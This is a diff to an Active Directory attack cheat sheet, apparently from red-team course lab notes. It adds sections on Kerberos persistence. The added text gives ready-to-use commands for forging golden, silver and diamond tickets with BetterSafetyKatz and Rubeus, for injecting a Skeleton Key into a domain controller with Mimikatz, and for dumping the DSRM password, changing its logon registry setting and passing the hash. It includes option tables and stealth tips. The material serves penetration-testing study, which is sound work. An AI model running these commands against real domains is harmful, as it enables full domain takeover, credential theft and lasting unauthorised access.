@@ -8,8 +8,14 @@
 * [Privilege Escalation](#privilege-escalation)
   * [Local Privilege Escalation](#local-admin-privilege-escalation-using-powerup)
 * [Kerberos](#kerberos)
-  * [Introduction] (#introduction)
-  * 
+  * [Introduction](#introduction)
+* [Persistence](#persistence)
+  * [Golden Ticket](#persistence-using-golden-tickets)
+  * [Silver Ticket](#persistence-using-silver-tickets)
+  * [Diamond Ticket](#persistence-using-diamond-tickets)
+  * [Skeleton Key](#persistence-using-skeleton-key)
+  * [DSRM](#persistence-using-dsrm)
+  * [Custom SSP](#persistence-using-custom-ssp)
 
 ## General
 Connect to a machine with Administrator privileges
@@ -690,6 +696,7 @@ $null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
 Kerberos is the basis of authentication in a Windows Active Directory environment. Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials. Therefore Kerberos is a very interesting target to abuse.
 
 ### Persistence using Golden Tickets
+
 A golden ticket is signed and encrypted by the hash of **krbtgt** account which makes it a valid TGT ticket. The **krbtgt** hash could be used to impersonate any user with any privileges from even a non-domain machine. As a good practice it is recommended to change the password of **krbtgt** account twice as password history is mantained for the account.
 
 **Requirements**
@@ -727,8 +734,126 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<dom
 | /endin | Optional Ticket lifetime in minutes (default 10 years) default DC setting is 600 |
 | /renewmax | Optional ticket lifetime with renewal (default 10 years) default DC setting is 100800 |
 
+**Using Rubeus**
 
+We can also use Rubeus to forge a Golden Ticket with attributes similar to a normal TGT using the following command
+```
+C:\AD\Tools\Rubeus.exe golden /aes256:<aes256_of_krbtgt> /sid:<domain_sid> /ldap /user:<username> /printcmd
+```
 
+To be more silent enumerate an provide also the following data:
+- Flags for user specified in /user
+- Retrieve /groups, /pgid, /minpassage and /maxpassage
+- /netbios of the current domain
+
+|  Options | Description  |
+|---|---|
+|  golden | Name of the module  | 
+| /user:  | username for which the TGT is required  |
+| /aes256 | krbtgt aes256 |
+| /sid | domain sid |
+| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
+| /domain | Domain FQDN |
+| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
+| /pwdlastset | PasswordLastSet for the user |
+| /minpassage | Minimum password age in days |
+| /logoncount | Logon count for the user |
+| /netbios:dcorp | NetBIOS name of the domain |
+| /dc | FQDN of the domain controller |
+| /uac | UserAccessControl Flags |
+
+## Persistence using silver tickets
+
+Silver ticket can be abused to access services on specific machines.
+
+**Accessible Services**
+- CIFS: File System
+- HTTP: commands
+- RPCSS: WMI
+- HOST: WMI
+
+For example using the command below we can access the File System on a machine.
+
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:<username> /domain:<domain_name> /sid:<domain_sid> /target:<machine_name\domain> /service:CIFS /rc4:<hash_of_machine> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+```
+
+|  Options | Description  |
+|---|---|
+|  kerberos::golden | Name of the module  | 
+| /user:  | username for which the TGT is required  |
+| /aes256 | krbtgt aes256 |
+| /sid | domain sid |
+| /id /groups | Optional user RID (default 500) and Group default 513, 512, 520, 518, 519 |
+| /domain | Domain FQDN |
+| /ptt or /ticket | /ptt injects the ticket in current process, /ticket saves the ticket for later use |
+| /target | Target FQDN |
+| /startoffset | Optional when ticket becomes valid |
+| /endin | Optional ticket lifetime |
+| /renewmax | Optional Ticket lifetime with renewal | 
+
+**Using Rubeus**
+
+To forge a silver ticket using Rubeus we can use the following command
+
+```
+C:\AD\Tools\Rubeus.exe silver /service:<service>/<target.domain> /rc4:<hash_of_target> /sid:<domain_sid> /ldap /user:<username> /domain:<domain_name>
+```
+
+## Persistence using Diamond Tickets
+
+A diamond ticket is created by decrypting a valid TGT, macking changes to it and re-encrypting it using the AES ticket of the krbtgt account. Therefore this is a ticket modification attack and not forging.
+
+Diamond tickets are more opsec than golden and silver.
+
+To create a diamond ticket use the following Rubeus command:
+
+```
+Rubeus.exe diamond /krbkey:<krbtgt_aes_key> /user:<username> /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain_name> /dc:<Domain_controller_name.domain> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+## Persistence using Skeleton Key
+
+Skeleton key is a persistence technique where it is possible to patch Domain Controller (lsass process) so that it allows access any user with a single password. 
+
+In order to perform this technique we need mimikatz. Use the command below to inject a skeleton key on a domain controller of choice. 
+
+**NOTE**: Domain Administrator privileges required
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -Computername <domain_controller.domain>
+```
+
+Now it is possible to access any machine with a valid username and password as "mimikatz"
+```
+Enter-PSSession -Computername <server_name> -credential <domain\username>
+```
+
+Skeleton keys are not opsec and can cause issues with Active Directory CS.
+
+## Persistence using DSRM
+DSRM is Directory Services Restore Mode, there is a local administrator on every DC called "Administrator" whose password is the DSRM password. DSRM password is required when a server is promoted to Domain Controller and it is rarely changed.
+After altering the configuration on the DC, it is possible to pass the NTLM hash of ths user to the DC.
+
+To dump the DSRM password run the following command with Domain Admin privileges:
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <domain_controller>
+```
+
+Compare the Administrator hash with the Administrator hash of below command
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' Computername <domain_controller>
+```
+
+Since it is the local administrator of the DC, we can pass the hash to authenticate, but the logon behavior of the DSRM account needs to be changed before we can use its hash
+```
+Enter-PSSession -Computername <domain_controller> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
+
+Then use the below command to pass the hash
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain_controller_name> /user:Administrator /ntlm:<Admin_hash> /run:powershell.exe"'
+```
+## Persistence using Custom SSP
 
 
 
